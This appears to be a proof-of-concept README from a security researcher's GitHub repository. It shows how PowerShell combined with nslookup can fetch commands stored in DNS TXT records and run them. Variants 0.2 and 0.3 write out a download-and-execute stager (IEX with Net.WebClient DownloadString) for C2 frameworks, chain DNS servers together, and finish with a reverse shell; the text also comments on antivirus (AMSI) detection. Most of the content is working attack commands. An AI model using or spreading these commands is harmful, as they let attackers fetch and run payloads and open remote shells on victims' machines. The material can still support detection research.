### Variant 0.1
Commands are stored as TXT entries on a DNS server and requested via nslookup (a.k.a "nshookup").<br><br>
Client executing:.<br>
`powershell (nslookup -q=txt domain.com)[5]`<br><br>
DNS Server entry:<br>
`ping google.com`<br><br>
*EXPLANATION: nslookup.exe calls the TXT entry through DNS as subprocess from powershell. This way the stored commands get transmitted over DNS and executed in the context of the current (powershell) process. The number in the brackets stands for the index (five being the first possible one) of the command. It is also possible to use "[-1]" should there be only a single command available as TXT entry.*<br><br>

The outcome is `powershell ping google.com` being executed in the current session on the clients system.

![GRAPHIC_1](https://github.com/Dood3/PoCs/assets/93183445/ed4ab94c-44fa-4cde-924b-10f26ebbc169)


### Variant 0.2
-> Commands are stored as TXT entries on a DNS server to host a payload/stager for a  reverse connection to a C2 server (Havoc, Empire, etc.).<br><br>
Client executing:<br>
`powershell (nslookup -q=txt domain.com)[5]`<br><br>
DNS Server entry:<br>
`IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
*EXPLANATION: Again, the TXT enty is interpreted as legitimate command through parent & child process being powershell and a DNS request respectively.
The file hosting the payload is not bound to any file formats. A simple file without suffix will work. 
This request will most likely trigger AV (AMSI). If "IEX" doesn't get caught, the delivered payload itself will.*<br>

 ![GRAPHIC_2](https://github.com/Dood3/PoCs/assets/93183445/b9052342-258e-4e92-8559-abdec97e44b8)


### Variant 0.3
-> Commands are stored as TXT entries on a domain1.com to host another nslookup command requesting entries from domain2.com.<br><br>
Client executing:<br>
`powershell (nslookup -q=txt domain1.com)[5]`<br><br>
DNS Server entry (the index may vary):<br>
`powershell (nslookup -q=txt domain2.com)[5]`<br><br>
DNS Server TXT entry on domain2.com:<br>
`IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
*EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands.on the second server.*<br>
This will most likely trigger AV (AMSI).<br>

1. `powershell (nslookup -q=txt bad-domain.com)[5]`<br>
2. `powershell (nslookup -q=txt bad-domain_2.com)[5]`<br>
3. `Command gets delivered to Client (over dns)`<br>
4. `Reverse shell phoning home`<br>

  ![GRAPHIC_3](https://github.com/Dood3/PoCs/assets/93183445/3243575e-8f56-478b-bf27-f3a1d4788557)

